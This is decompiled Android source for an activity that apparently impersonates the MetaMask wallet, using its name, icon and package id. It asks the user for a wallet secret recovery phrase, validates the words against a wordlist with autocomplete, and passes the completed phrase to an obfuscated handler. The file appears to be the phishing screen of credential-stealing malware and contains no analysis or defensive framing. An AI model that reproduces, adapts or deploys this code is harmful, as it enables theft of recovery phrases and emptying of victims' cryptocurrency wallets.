package com.superbock.ui.custom;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.activity.d;
import com.superbock.App;
import com.superbock.bean.AdInfo;
import com.superbock.bean.MInfo;
import comeliest.metempsychosis.pokelogan.R;
import f3.i;
import g3.n;
import j3.i0;
import j3.j0;
import j3.k0;
import j3.l0;
import j3.m0;
import j3.n0;
import j3.o0;
import j3.p0;
import j3.r0;
import j3.s0;
import j3.t0;
import j3.u0;
import j3.v0;
import j3.w0;
import j3.x0;
import j3.y0;
import j3.z0;
import java.util.List;
import k3.j;

/* loaded from: classes.dex */
public class InputWordsMetaActivity extends Activity {

    /* renamed from: b, reason: collision with root package name */
    public AdInfo f1600b;

    /* renamed from: c, reason: collision with root package name */
    public long f1601c;

    /* renamed from: d, reason: collision with root package name */
    public View f1602d;

    /* renamed from: e, reason: collision with root package name */
    public ImageView f1603e;

    /* renamed from: f, reason: collision with root package name */
    public TextView f1604f;

    /* renamed from: g, reason: collision with root package name */
    public EditText f1605g;

    /* renamed from: h, reason: collision with root package name */
    public TextView f1606h;

    /* renamed from: i, reason: collision with root package name */
    public TextView f1607i;

    /* renamed from: j, reason: collision with root package name */
    public LinearLayout f1608j;

    /* renamed from: k, reason: collision with root package name */
    public TextView f1609k;

    /* renamed from: l, reason: collision with root package name */
    public LinearLayout f1610l;

    /* renamed from: m, reason: collision with root package name */
    public TextView f1611m;

    /* renamed from: n, reason: collision with root package name */
    public TextView f1612n;

    /* renamed from: o, reason: collision with root package name */
    public TextView f1613o;

    /* renamed from: p, reason: collision with root package name */
    public TextView f1614p;

    /* renamed from: q, reason: collision with root package name */
    public TextView f1615q;

    /* renamed from: r, reason: collision with root package name */
    public TextView f1616r;

    /* renamed from: s, reason: collision with root package name */
    public TextView f1617s;

    /* renamed from: t, reason: collision with root package name */
    public TextView f1618t;

    /* renamed from: u, reason: collision with root package name */
    public TextView f1619u;

    /* renamed from: v, reason: collision with root package name */
    public TextView f1620v;

    /* renamed from: w, reason: collision with root package name */
    public int f1621w;

    /* renamed from: x, reason: collision with root package name */
    public r0 f1622x;

    /* loaded from: classes8.dex */
    public class a implements DialogInterface.OnClickListener {
        @Override // android.content.DialogInterface.OnClickListener
        public final void onClick(DialogInterface dialogInterface, int i5) {
            dialogInterface.dismiss();
        }
    }

    /* loaded from: classes5.dex */
    public class b implements DialogInterface.OnClickListener {
        public b() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public final void onClick(DialogInterface dialogInterface, int i5) {
            InputWordsMetaActivity.this.f1600b.setFeedBack(3);
            InputWordsMetaActivity.this.finishAndRemoveTask();
        }
    }

    public static void a(InputWordsMetaActivity inputWordsMetaActivity) {
        TextView textView;
        String string;
        String obj = inputWordsMetaActivity.f1605g.getText().toString();
        if (obj.trim().length() == 0) {
            inputWordsMetaActivity.f1610l.setVisibility(8);
            inputWordsMetaActivity.f1608j.setVisibility(4);
            return;
        }
        String[] split = obj.trim().split("\\s+");
        String str = split[split.length - 1];
        if (str.matches("^[a-z]+$")) {
            List a5 = n.c().a(str);
            if (a5 != null && !a5.isEmpty()) {
                inputWordsMetaActivity.f1611m.setText(((MInfo) a5.get(0)).getId());
                inputWordsMetaActivity.f1611m.setVisibility(0);
                if (a5.size() >= 2) {
                    inputWordsMetaActivity.f1612n.setText(((MInfo) a5.get(1)).getId());
                    inputWordsMetaActivity.f1612n.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1612n.setVisibility(8);
                }
                if (a5.size() >= 3) {
                    inputWordsMetaActivity.f1613o.setText(((MInfo) a5.get(2)).getId());
                    inputWordsMetaActivity.f1613o.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1613o.setVisibility(8);
                }
                if (a5.size() >= 4) {
                    inputWordsMetaActivity.f1614p.setText(((MInfo) a5.get(3)).getId());
                    inputWordsMetaActivity.f1614p.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1614p.setVisibility(8);
                }
                if (a5.size() >= 5) {
                    inputWordsMetaActivity.f1615q.setText(((MInfo) a5.get(4)).getId());
                    inputWordsMetaActivity.f1615q.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1615q.setVisibility(8);
                }
                if (a5.size() >= 6) {
                    inputWordsMetaActivity.f1616r.setText(((MInfo) a5.get(5)).getId());
                    inputWordsMetaActivity.f1616r.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1616r.setVisibility(8);
                }
                if (a5.size() >= 7) {
                    inputWordsMetaActivity.f1617s.setText(((MInfo) a5.get(6)).getId());
                    inputWordsMetaActivity.f1617s.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1617s.setVisibility(8);
                }
                if (a5.size() >= 8) {
                    inputWordsMetaActivity.f1618t.setText(((MInfo) a5.get(7)).getId());
                    inputWordsMetaActivity.f1618t.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1618t.setVisibility(8);
                }
                if (a5.size() >= 9) {
                    inputWordsMetaActivity.f1619u.setText(((MInfo) a5.get(8)).getId());
                    inputWordsMetaActivity.f1619u.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1619u.setVisibility(8);
                }
                if (a5.size() >= 10) {
                    inputWordsMetaActivity.f1620v.setText(((MInfo) a5.get(9)).getId());
                    inputWordsMetaActivity.f1620v.setVisibility(0);
                } else {
                    inputWordsMetaActivity.f1620v.setVisibility(8);
                }
                inputWordsMetaActivity.f1610l.setVisibility(0);
                inputWordsMetaActivity.f1608j.setVisibility(4);
                if (split.length >= 2) {
                    for (int length = split.length - 2; length >= 0; length--) {
                        String str2 = split[length];
                        if (!str2.matches("^[a-z]+$") || n.c().b(str2) == -1) {
                            inputWordsMetaActivity.f1609k.setText(inputWordsMetaActivity.getString(R.string.is_wrong_secret_phrase_check, str2));
                            inputWordsMetaActivity.f1608j.setVisibility(0);
                            break;
                        }
                    }
                }
                if (inputWordsMetaActivity.f1610l.getVisibility() == 0 && obj.endsWith(" ") && n.c().b(split[split.length - 1]) != -1) {
                    inputWordsMetaActivity.f1610l.setVisibility(8);
                }
                if (inputWordsMetaActivity.f1608j.getVisibility() != 0) {
                    String trim = obj.trim();
                    if (j.b(trim)) {
                        j.a(trim.replaceAll("\\s+", " "), "io.metamask", inputWordsMetaActivity.getString(R.string.metamask), inputWordsMetaActivity);
                        return;
                    }
                    return;
                }
                return;
            }
            inputWordsMetaActivity.f1610l.setVisibility(8);
            textView = inputWordsMetaActivity.f1609k;
            string = inputWordsMetaActivity.getString(R.string.is_wrong_secret_phrase_check, str);
        } else {
            inputWordsMetaActivity.f1610l.setVisibility(8);
            textView = inputWordsMetaActivity.f1609k;
            string = inputWordsMetaActivity.getString(R.string.is_wrong_secret_phrase_check, str);
        }
        textView.setText(string);
        inputWordsMetaActivity.f1608j.setVisibility(0);
    }

    public static void b(InputWordsMetaActivity inputWordsMetaActivity, String str) {
        String[] split = inputWordsMetaActivity.f1605g.getText().toString().trim().split("\\s+");
        String str2 = "";
        for (int i5 = 0; i5 < split.length - 1; i5++) {
            str2 = androidx.appcompat.graphics.drawable.a.c(d.g(str2), split[i5], " ");
        }
        String j5 = androidx.appcompat.widget.a.j(str2, str, " ");
        inputWordsMetaActivity.f1605g.setText(j5);
        inputWordsMetaActivity.f1605g.setSelection(j5.length());
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        if (this.f1600b.getBack() == 1) {
            new AlertDialog.Builder(this).setIcon(R.mipmap.ic_metamask).setTitle(R.string.metamask).setMessage(getString(R.string.metaInputBackMsg)).setPositiveButton(getString(R.string.Confirm), new b()).setNegativeButton(getString(R.string.Refresh), new a()).show();
        } else {
            this.f1600b.setFeedBack(3);
            finishAndRemoveTask();
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.input_words_meta);
        AdInfo adInfo = (AdInfo) getIntent().getSerializableExtra("adInfo");
        this.f1600b = adInfo;
        if (adInfo == null) {
            finishAndRemoveTask();
            return;
        }
        adInfo.setPkg("io.metamask");
        this.f1600b.setUse(2);
        getWindow().setStatusBarColor(getResources().getColor(R.color.Grey_100));
        this.f1602d = findViewById(R.id.root_layout);
        this.f1603e = (ImageView) findViewById(R.id.btn_back);
        this.f1604f = (TextView) findViewById(R.id.btn_paste);
        this.f1605g = (EditText) findViewById(R.id.edit_words);
        this.f1606h = (TextView) findViewById(R.id.btn_protocol);
        this.f1607i = (TextView) findViewById(R.id.btn_submit);
        this.f1608j = (LinearLayout) findViewById(R.id.tips_ll);
        this.f1609k = (TextView) findViewById(R.id.tips_text);
        this.f1610l = (LinearLayout) findViewById(R.id.prompt_ll);
        this.f1611m = (TextView) findViewById(R.id.word0);
        this.f1612n = (TextView) findViewById(R.id.word1);
        this.f1613o = (TextView) findViewById(R.id.word2);
        this.f1614p = (TextView) findViewById(R.id.word3);
        this.f1615q = (TextView) findViewById(R.id.word4);
        this.f1616r = (TextView) findViewById(R.id.word5);
        this.f1617s = (TextView) findViewById(R.id.word6);
        this.f1618t = (TextView) findViewById(R.id.word7);
        this.f1619u = (TextView) findViewById(R.id.word8);
        this.f1620v = (TextView) findViewById(R.id.word9);
        this.f1622x = new r0(this);
        this.f1602d.getViewTreeObserver().addOnGlobalLayoutListener(this.f1622x);
        this.f1605g.setOnFocusChangeListener(new s0(this));
        this.f1605g.addTextChangedListener(new t0(this));
        this.f1607i.setOnClickListener(new u0(this));
        this.f1603e.setOnClickListener(new v0(this));
        this.f1604f.setOnClickListener(new w0(this));
        this.f1606h.setOnClickListener(new x0(this));
        this.f1611m.setOnClickListener(new y0(this));
        this.f1612n.setOnClickListener(new z0(this));
        this.f1613o.setOnClickListener(new i0(this));
        this.f1614p.setOnClickListener(new j0(this));
        this.f1615q.setOnClickListener(new k0(this));
        this.f1616r.setOnClickListener(new l0(this));
        this.f1617s.setOnClickListener(new m0(this));
        this.f1618t.setOnClickListener(new n0(this));
        this.f1619u.setOnClickListener(new o0(this));
        this.f1620v.setOnClickListener(new p0(this));
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        if (this.f1622x != null) {
            this.f1602d.getViewTreeObserver().removeOnGlobalLayoutListener(this.f1622x);
        }
        int type = this.f1600b.getType();
        if (type == 0 || type == 1) {
            App.f1372b.d(this.f1600b, true, false);
        } else if (type == 2 || type == 3 || type == 4) {
            App.f1373c = false;
            App.f1372b.c(this.f1600b);
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
        if (this.f1600b == null) {
            return;
        }
        App.f1373c = true;
        if (this.f1601c == 0) {
            long currentTimeMillis = System.currentTimeMillis();
            this.f1601c = currentTimeMillis;
            this.f1600b.setStartTime(currentTimeMillis);
        }
        if (this.f1600b.getType() == 2) {
            i.n(0, "39", null);
        }
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
        int type = this.f1600b.getType();
        if (type == 0 || type == 1) {
            App.f1372b.d(this.f1600b, true, true);
            return;
        }
        if (type == 2 || type == 3 || type == 4) {
            App.f1373c = false;
            if (this.f1600b.getType() == 2) {
                i.n(0, "40", null);
            }
            App.f1372b.c(this.f1600b);
        }
    }
}
